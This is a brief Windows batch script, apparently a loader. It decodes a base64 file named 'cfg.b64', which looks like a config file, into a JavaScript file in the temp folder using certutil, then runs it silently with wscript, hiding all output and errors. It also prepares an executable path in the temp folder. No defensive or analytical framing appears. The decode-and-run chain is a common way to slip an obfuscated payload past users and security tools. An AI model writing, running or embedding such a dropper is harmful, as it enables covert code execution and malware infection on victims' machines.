@echo off
setlocal
set "OUT=%TEMP%\rbc_4be5737b474f4501.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_4be5737b474f4501.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_4be5737b474f4501.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_4be5737b474f4501.js"
exit /b 0
